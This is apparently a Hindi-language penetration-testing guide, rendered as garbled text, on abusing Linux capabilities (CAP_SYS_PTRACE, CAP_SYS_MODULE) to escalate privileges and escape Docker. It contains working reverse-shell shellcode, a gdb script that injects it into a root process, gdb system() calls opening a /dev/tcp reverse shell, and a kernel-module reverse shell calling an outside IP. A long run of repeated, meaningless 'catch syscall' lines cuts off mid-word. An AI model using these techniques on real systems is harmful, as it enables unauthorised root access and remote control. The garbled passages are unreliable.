рдЬреАрдбреАрдмреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдордПрд╕рдПрдлрд╡реЗрдирдо рдХреЗ рд╕рд╛рде рдПрдХ рд╢реЗрд▓рдХреЛрдб рдмрдирд╛рдПрдВред

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<рдЖрдкрдХрд╛ IP> LPORT=<рдЖрдкрдХрд╛ рдкреЛрд░реНрдЯ> -f c -b "\x00" -e x86/shikata_ga_nai
```

рдпрд╣рд╛рдВ `<рдЖрдкрдХрд╛ IP>` рдХреЛ рдЕрдкрдиреЗ рдЖрдИрдкреА рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рдФрд░ `<рдЖрдкрдХрд╛ рдкреЛрд░реНрдЯ>` рдХреЛ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреЛрд░реНрдЯ рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рдмрджрд▓реЗрдВред
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
рдЬреАрдбреАрдмреА рдХреЗ рд╕рд╛рде рд░реВрдЯ рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдбреАрдмрдЧ рдХрд░реЗрдВ рдФрд░ рдкрд╣рд▓реЗ рдЙрддреНрдкрдиреНрди рдЬреАрдбреАрдмреА рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдХреЙрдкреА-рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ:

```bash
gdb -p <pid>
```

рдЬреАрдбреАрдмреА рдкреНрд░реЛрдореНрдкреНрдЯ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдХреЙрдкреА-рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ:

```bash
set follow-fork-mode child
set detach-on-fork off
```

рдЕрдм, рд░реВрдЯ рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдбреАрдмрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреАрдбреАрдмреА рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рдХреЙрдкреА-рдкреЗрд╕реНрдЯ рдХрд░реЗрдВ:

```bash
catch syscall ptrace
catch syscall fork
catch syscall clone
catch syscall vfork
catch syscall execve
catch syscall execveat
catch syscall setuid
catch syscall setgid
catch syscall setreuid
catch syscall setregid
catch syscall setresuid
catch syscall setresgid
catch syscall setfsuid
catch syscall setfsgid
catch syscall capset
catch syscall capsetp
catch syscall capsetxattr
catch syscall capget
catch syscall capgetp
catch syscall capgetxattr
catch syscall capsetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall capgetxattr
catch syscall cap
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**рдЙрджрд╛рд╣рд░рдг рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ) - рдПрдХ рдФрд░ gdb рджреБрд░реБрдкрдпреЛрдЧ**

рдпрджрд┐ **GDB** рд╕реНрдерд╛рдкрд┐рдд рд╣реИ (рдпрд╛ рдЖрдк рдЗрд╕реЗ `apk add gdb` рдпрд╛ `apt install gdb` рдХреЗ рд╕рд╛рде рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ), рддреЛ рдЖрдк **рдореЗрдЬрдмрд╛рди рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдбреАрдмрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЗрд╕реЗ `system` рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред (рдпрд╣ рддрдХрдиреАрдХ рднреА рдХреНрд╖рдорддрд╛ `SYS_ADMIN` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
рдЖрдк рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрдорд╛рдВрдб рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рдирд╣реАрдВ рджреЗрдЦ рдкрд╛рдПрдВрдЧреЗ, рд▓реЗрдХрд┐рди рд╡рд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ (рдЗрд╕рд▓рд┐рдП рдПрдХ рд░реЗрд╡ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ)ред

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЛ рддреНрд░реБрдЯрд┐ "No symbol "system" in current context." рдорд┐рд▓рддреА рд╣реИ, рддреЛ gdb рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдореЗрдВ рд╢реИрд▓рдХреЛрдб рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
{% endhint %}

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (рдбреЙрдХрд░ рдмреНрд░реЗрдХрдЖрдЙрдЯ) - рд╢реИрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрд╢рди**

рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
# CAP_SYS_MODULE

[CAP_SYS_MODULE](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓реНрд╕ (`init_module(2)`, `finit_module(2)` рдФрд░ `delete_module(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓) рдХреЛ рд▓реЛрдб рдФрд░ рдЕрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рд╕рд░рд▓ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдФрд░ рд░рд┐рдВрдЧ-0 рд╕рдВрдХрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдХрд░реНрдирд▓ рдХреЛ рдЗрдЪреНрдЫрд╛рдиреБрд╕рд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рднреА рд╕рд┐рд╕реНрдЯрдо рд╕реБрд░рдХреНрд╖рд╛, рд▓рд┐рдирдХреНрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбреНрдпреВрд▓ рдФрд░ рдХрдВрдЯреЗрдирд░ рд╕рд┐рд╕реНрдЯрдо рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред\
**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рд╣реЛрд╕реНрдЯ рдорд╢реАрди рдХреЗ рдХрд░реНрдирд▓ рдореЗрдВ рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ/рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред**

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдмрд╛рдЗрдирд░реА **`python`** рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **`modprobe`** рдХрдорд╛рдВрдб **`/lib/modules/$(uname -r)`** рдирд╛рдордХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдбрд┐рдкреЗрдВрдбреЗрдВрд╕реА рд╕реВрдЪреА рдФрд░ рдореИрдк рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред\
рдЗрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЪрд▓реЛ рдПрдХ рдирдХрд▓реА **lib/modules** рдлрд╝реЛрд▓реНрдбрд░ рдмрдирд╛рддреЗ рд╣реИрдВ:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
рддреЛ **рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ, рдиреАрдЪреЗ 2 рдЙрджрд╛рд╣рд░рдг рджрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░** рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
рдЕрдВрдд рдореЗрдВ, рдЗрд╕ рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдкрд╛рдпрдерди рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**рдЙрджрд╛рд╣рд░рдг 2 рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдмрд╛рдЗрдирд░реА **`kmod`** рдХреЗ рдкрд╛рд╕ рдпрд╣ рдХреНрд╖рдорддрд╛ рд╣реИред
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдХрд░реНрдирд▓ рдореЙрдбреНрдпреВрд▓ рдбрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб **`insmod`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рд╡рд┐рд╢реЗрд╖рд╛рдВрдХ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
рдкрд┐рдЫрд▓реЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **SYS\_MODULE** рдХреНрд╖рдорддрд╛ рд╕рдХреНрд╖рдо рд╣реИред

**рдХрд░реЗрдирд▓ рдореЙрдбреНрдпреВрд▓** рдмрдирд╛рдПрдВ рдЬреЛ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдЪрд▓рд╛рдПрдЧрд╛ рдФрд░ рдЗрд╕реЗ **рдХрдВрдкрд╛рдЗрд▓** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **Makefile** рдмрдирд╛рдПрдВ:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
